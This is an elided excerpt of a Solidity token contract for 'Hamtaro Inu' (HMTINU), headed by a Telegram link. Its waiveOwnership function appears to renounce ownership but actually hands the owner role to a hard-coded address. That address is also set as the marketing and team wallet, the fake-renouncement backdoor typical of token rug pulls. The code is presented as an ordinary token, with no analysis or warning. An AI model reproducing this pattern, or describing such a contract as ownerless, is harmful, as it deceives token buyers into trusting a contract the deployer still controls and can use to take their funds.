...
/**
Telegram : https://t.me/HamtaroInuPortal
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xB8C5A58aeC12eF86508fd19b12ccF018B0D58eC4);
    }
...
contract HamtaroInu is Context, IERC20, Ownable {
    ...
    string private _name = "Hamtaro Inu";
    string private _symbol = "HMTINU";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xB8C5A58aeC12eF86508fd19b12ccF018B0D58eC4);
    address payable private teamWalletAddress = payable(0xB8C5A58aeC12eF86508fd19b12ccF018B0D58eC4);
